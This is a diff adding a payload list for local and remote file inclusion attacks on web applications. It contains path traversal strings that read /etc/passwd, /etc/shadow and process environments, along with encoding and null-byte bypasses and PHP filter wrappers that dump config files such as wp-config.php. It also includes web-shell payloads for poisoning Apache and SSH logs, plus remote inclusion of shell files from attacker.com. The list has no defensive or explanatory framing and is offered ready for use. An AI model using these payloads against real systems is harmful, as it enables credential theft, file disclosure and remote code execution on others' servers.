@@ -1,0 +1,84 @@
+# LFI/RFI Payloads
+# Categories: Basic Traversal, Wrappers, RFI, Log Poisoning, Windows
+
+# === Basic Directory Traversal ===
+../../../etc/passwd
+../../etc/passwd
+../etc/passwd
+../../../../etc/passwd
+../../../../../etc/passwd
+../../../../../../etc/passwd
+..\\..\\..\\..\\..\\boot.ini
+..\\..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts
+
+# === URL-Encoded Traversal ===
+%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
+..%252f..%252f..%252fetc%252fpasswd
+..%c0%af..%c0%af..%c0%afetc%c0%afpasswd
+%252e%252e%252fetc%252fpasswd
+
+# === Double Encoding ===
+..%252f..%252f..%252fetc%252fpasswd
+%252e%252e%252f%252e%252e%252fetc%252fpasswd
+
+# === Null Byte Injection (Older PHP) ===
+../../../etc/passwd%00
+../../../etc/passwd%00.txt
+../../../etc/passwd%2500
+
+# === PHP Wrappers ===
+php://filter/convert.base64-encode/resource=index.php
+php://filter/convert.base64-encode/resource=config
+php://filter/read=convert.base64-encode/resource=../../etc/passwd
+php://filter/convert.base64-encode/resource=../config.php
+php://filter/convert.base64-encode/resource=/etc/passwd
+php://input
+php://filter/convert.base64-encode/resource=../wp-config.php
+
+# === PHP Wrappers — RCE via Expect/Input ===
+php://input (POST: <?php system('id'); ?>)
+expect://id
+php://filter/convert.base64-encode/resource=../.git/config
+
+# === Log Poisoning → RCE ===
+# Inject PHP in User-Agent → include access.log:
+<?php system($_GET['cmd']);?>
+<?php echo shell_exec($_GET['cmd']);?>
+
+# Then access: ../../../var/log/apache2/access.log&cmd=id
+
+# === SSH Log Poisoning ===
+# Connect via SSH with PHP payload in username:
+<?php system($_GET['c']);?>
+
+# Then access: ../../../var/log/auth.log&c=id
+
+# === /proc/self/environ (User-Agent injection) ===
+../../../proc/self/environ
+../../../../proc/self/environ
+../../../../../proc/self/environ
+
+# === Various Platforms ===
+# Linux:
+../../../etc/passwd
+../../../etc/shadow
+../../../etc/hosts
+../../../etc/issue
+../../../proc/version
+../../../proc/self/cmdline
+../../../proc/self/environ
+
+# Windows:
+..\\..\\..\\boot.ini
+..\\..\\..\\windows\\win.ini
+..\\..\\..\\windows\\system32\\drivers\\etc\\hosts
+
+# Java:
+WEB-INF/web.xml
+META-INF/MANIFEST.MF
+
+# === RFI ===
+http://attacker.com/shell.txt
+https://attacker.com/shell.txt
+http://attacker.com/shell.php
+data:text/plain,<?php system('id');?>
